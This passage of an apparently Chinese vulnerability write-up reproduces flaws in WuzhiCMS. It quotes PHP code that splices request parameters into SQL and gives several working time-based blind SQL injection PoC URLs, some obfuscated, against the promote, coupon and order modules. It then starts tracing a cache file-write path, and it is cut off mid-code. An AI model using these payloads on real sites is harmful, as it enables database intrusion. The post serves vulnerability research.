#56B6C2">isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;page&#39;</span><span style="color: #ABB2BF">]) </span><span style="color: #C678DD">?</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">intval</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;page&#39;</span><span style="color: #ABB2BF">]) </span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">       </span><span style="color: #E06C75">$page</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">max</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$page</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">       </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;keywords&#39;</span><span style="color: #ABB2BF">])) {</span></span><span class="line"><span style="color: #ABB2BF">           </span><span style="color: #E06C75">$keywords</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;keywords&#39;</span><span style="color: #ABB2BF">];</span></span><span class="line"><span style="color: #ABB2BF">           </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;`name` LIKE &#39;%</span><span style="color: #E06C75">$keywords</span><span style="color: #98C379">%&#39;&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">       } </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">           </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">       }</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$result</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">get_list</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;copyfrom&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;*&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">20</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">$page</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$pages</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">pages</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">       </span><span style="color: #E06C75">$total</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">number</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">include</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">template</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;copyfrom_listing&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><ol start="4"><li><p>&#x2F;index.php?m&#x3D;core&amp;f&#x3D;copyfrom&amp;v&#x3D;listing&amp;_su&#x3D;wuzhicms 搜索框存在注入</p><p>(copyfrom文件下的listing方法中存在一个可控全局变量参数keywords由$where控制)</p></li><li><p>测试抓包写入语句**(延时注入)**</p><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">m</span><span style="color: #56B6C2">=</span><span style="color: #98C379">core</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">f</span><span style="color: #56B6C2">=</span><span style="color: #98C379">copyfrom</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">v</span><span style="color: #56B6C2">=</span><span style="color: #98C379">listing</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">_su</span><span style="color: #56B6C2">=</span><span style="color: #98C379">wuzhicms</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">keywords</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">1</span><span style="color: #98C379">&#39; AND (SELECT 1228 FROM (SELECT(SLEEP(5)))jFgw)--+ JQJJ</span></span></code></pre></div></div></figure></li></ol><p>其他注入</p><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">POC：/wuzhicms/www/index.php?m</span><span style="color: #ABB2BF">=promote&amp;</span><span style="color: #E06C75">f</span><span style="color: #56B6C2">=</span><span style="color: #98C379">index</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">v</span><span style="color: #56B6C2">=</span><span style="color: #98C379">search</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">_su</span><span style="color: #56B6C2">=</span><span style="color: #98C379">wuzhicms</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">fieldtype</span><span style="color: #56B6C2">=</span><span style="color: #98C379">place</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">keywords</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">88888</span><span style="color: #98C379">%bf%27/%2AAAA%2A//%2AAAA%2A/AND/%2AAAA%2A//%2AAAA%2A/%28SELECT/%2AAAA%2A//%2AAAA%2A/6572/%2AAAA%2A//%2AAAA%2A/FROM/%2AAAA%2A//%2AAAA%2A/%28SELECT%28SLEEP%284%29%29%29GZXQ%29--%20vLAW</span></span><span class="line"><span style="color: #61AFEF">POC：/wuzhicms/www/index.php?m</span><span style="color: #ABB2BF">=coupon&amp;</span><span style="color: #E06C75">f</span><span style="color: #56B6C2">=</span><span style="color: #98C379">card</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">v</span><span style="color: #56B6C2">=</span><span style="color: #98C379">detail_listing</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">_su</span><span style="color: #56B6C2">=</span><span style="color: #98C379">wuzhicms</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">groupname</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">88888</span><span style="color: #98C379">%bf%27/%2AAAA%2A//%2AAAA%2A/AND/%2AAAA%2A//%2AAAA%2A/%28SELECT/%2AAAA%2A//%2AAAA%2A/6572/%2AAAA%2A//%2AAAA%2A/FROM/%2AAAA%2A//%2AAAA%2A/%28SELECT%28SLEEP%284%29%29%29GZXQ%29--%20vLAW</span></span><span class="line"><span style="color: #61AFEF">POC：wuzhicms/www/index.php?m</span><span style="color: #ABB2BF">=order&amp;</span><span style="color: #E06C75">f</span><span style="color: #56B6C2">=</span><span style="color: #98C379">card</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">v</span><span style="color: #56B6C2">=</span><span style="color: #98C379">listing</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">_su</span><span style="color: #56B6C2">=</span><span style="color: #98C379">wuzhicms</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">keytype</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">batchid</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">123</span><span style="color: #98C379">d%27/%2AAAA%2A//%2AAAA%2A/AND/%2AAAA%2A//%2AAAA%2A/%28SELECT/%2AAAA%2A//%2AAAA%2A/3462/%2AAAA%2A//%2AAAA%2A/FROM/%2AAAA%2A//%2AAAA%2A/%28SELECT%28SLEEP%284%29%29%29aR%29--%20</span></span><span class="line"><span style="color: #61AFEF">POC：/wuzhicms/www/index.php?m</span><span style="color: #ABB2BF">=order&amp;</span><span style="color: #E06C75">f</span><span style="color: #56B6C2">=</span><span style="color: #98C379">goods</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">v</span><span style="color: #56B6C2">=</span><span style="color: #98C379">listing</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">_su</span><span style="color: #56B6C2">=</span><span style="color: #98C379">wuzhicms</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">keywords</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">888111</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">keytype</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">cardtype</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">188</span><span style="color: #98C379">%27/%2AAAA%2A//%2AAAA%2A/AND/%2AAAA%2A//%2AAAA%2A/%28SELECT/%2AAAA%2A//%2AAAA%2A/3462/%2AAAA%2A//%2AAAA%2A/FROM/%2AAAA%2A//%2AAAA%2A/%28SELECT%28SLEEP%284%29%29%29aR%29--%20</span></span></code></pre></div></div></figure><h2 id="复现2-sql"><a href="#复现2-sql" class="headerlink" title="复现2(sql)"></a>复现2(sql)</h2><p>coreframe\app\promote\admin\index.php</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">search</span><span style="color: #ABB2BF">() {</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">$siteid</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">get_cookie</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;siteid&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">$page</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;page&#39;</span><span style="color: #ABB2BF">]) </span><span style="color: #C678DD">?</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">intval</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;page&#39;</span><span style="color: #ABB2BF">]) </span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">$page</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">max</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$page</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">$fieldtype</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;fieldtype&#39;</span><span style="color: #ABB2BF">];</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">$keywords</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;keywords&#39;</span><span style="color: #ABB2BF">];</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$fieldtype</span><span style="color: #56B6C2">==</span><span style="color: #98C379">&#39;place&#39;</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;`siteid`=&#39;</span><span style="color: #E06C75">$siteid</span><span style="color: #98C379">&#39; AND `name` LIKE &#39;%</span><span style="color: #E06C75">$keywords</span><span style="color: #98C379">%&#39;&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">$result</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">get_list</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;promote_place&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;*&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">50</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">$page</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;pid ASC&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">$pages</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">pages</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">$total</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">number</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">include</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">template</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;listingplace&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    } </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;`siteid`=&#39;</span><span style="color: #E06C75">$siteid</span><span style="color: #98C379">&#39; AND `</span><span style="color: #E06C75">$fieldtype</span><span style="color: #98C379">` LIKE &#39;%</span><span style="color: #E06C75">$keywords</span><span style="color: #98C379">%&#39;&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">$result</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">get_list</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;promote&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;*&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">20</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">$page</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;id DESC&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">$pages</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">pages</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">$total</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">number</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">include</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">template</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;listing&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span></code></pre></div></div></figure><p>获取到的keywords参数拼接到SQL语句，然后带入数据库执行，导致程序在实现上存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息</p><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">/index.php?m</span><span style="color: #ABB2BF">=promote&amp;</span><span style="color: #E06C75">f</span><span style="color: #56B6C2">=</span><span style="color: #98C379">index</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">v</span><span style="color: #56B6C2">=</span><span style="color: #98C379">search</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">_su</span><span style="color: #56B6C2">=</span><span style="color: #98C379">wuzhicms</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">fieldtype</span><span style="color: #56B6C2">=</span><span style="color: #98C379">place</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">keywords</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">1111</span><span style="color: #98C379">%&#39;*%23(拼接sql语句)</span></span></code></pre></div></div></figure><h2 id="复现3-文件写入"><a href="#复现3-文件写入" class="headerlink" title="复现3(文件写入)"></a>复现3(文件写入)</h2><ol><li><p>寻找file_put_contents 函数的参数是否可控制</p><p>coreframe\app\core\libs\function\common.func.php</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">/**</span></span><span class="line"><span style="color: #7F848E; font-style: italic"> * 写入缓存</span></span><span class="line"><span style="color: #7F848E; font-style: italic"> * </span><span style="color: #C678DD; font-style: italic">@param</span><span style="color: #7F848E; font-style: italic"> $filename 文件名</span></span><span class="line"><span style="color: #7F848E; font-style: italic"> * </span><span style="color: #C678DD; font-style: italic">@param</span><span style="color: #7F848E; font-style: italic"> $data 数组或者字符串</span></span><span class="line"><span style="color: #7F848E; font-style: italic"> * </span><span style="color: #C678DD; font-style: italic">@param</span><span style="color: #7F848E; font-style: italic"> </span><span style="color: #E5C07B; font-style: italic">string</span><span style="color: #7F848E; font-style: italic"> $dir 写入目录名，文件缓存写入：/caches/$dir</span></span><span class="line"><span style="color: #7F848E; font-style: italic"> * </span><span style="color: #C678DD; font-style: italic">@return</span><span style="color: #7F848E; font-style: italic"> </span><span style="color: #E5C07B; font-style: italic">bool</span></span><span class="line"><span style="color: #7F848E; font-style: italic"> */</span></span><span class="line"><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">set_cache</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$filename</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$data</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$dir</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;_cache_&#39;</span><span style="color: #ABB2BF">){</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$_dirs</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">$dir</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">FALSE</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!preg_match</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">&#39;/([a-z0-9_]</span><span style="color: #C678DD">+</span><span style="color: #E06C75">)/i&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$filename</span><span style="color: #ABB2BF">)) </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">FALSE</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$cache_path</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> CACHE_ROOT </span><span style="color: #ABB2BF">.</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$dir</span><span style="color: #ABB2BF"> </span><span style="color: #ABB2BF">.</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;/&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_dirs</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$filename</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$dir</span><span style="color: #ABB2BF">])) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!is_dir</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$cache_path</span><span style="color: #ABB2BF">)) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #56B6C2">mkdir</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$cache_path</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #D19A66">0777</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$_dirs</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$filename</span><span style="color: #ABB2BF"> </span><span style="color: #ABB2BF">.</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$dir</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$filename</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$cache_path</span><span style="color: #ABB2BF"> </span><span style="color: #ABB2BF">.</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$filename</span><span style="color: #ABB2BF"> </span><span style="color: #ABB2BF">.</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;.&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #ABB2BF">.</span><span style="color: #ABB2BF"> CACHE_EXT </span><span style="color: #ABB2BF">.</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;.php&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">is_array</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$data</span><span style="color: #ABB2BF">)) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$data</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;&lt;?php&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #ABB2BF">.</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\r\n</span><span style="color: #98C379"> return &quot;</span><span style="color: #ABB2BF"> </span><span style="color: #ABB2BF">.</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">array2string</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$data</span><span style="color: #ABB2BF">) </span><span style="color: #ABB2BF">.</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;?&gt;&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #56B6C2">file_put_contents</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$filename</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$data</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure></li><li><p>file_put_contents存在于set_cache中，寻找定义</p><p>&#x2F;coreframe&#x2F;app&#x2F;attachment&#x2F;admin&#x2F;index.php</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">()</span></span><span class="line"><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;submit&#39;</span><span style="color: #ABB2BF">])) {</span></span><span class="line"><span style="color: #ABB2BF">         </span><span style="color: #61AFEF">set_cache</span><span style="color: #ABB2BF">(M,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;setting&#39;</span><span style="color: #ABB2BF">]);</span></span><span class="line"><span style="color: #ABB2BF">         </span><span style="color: #61AFEF">MSG</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">L</span><span style="color: 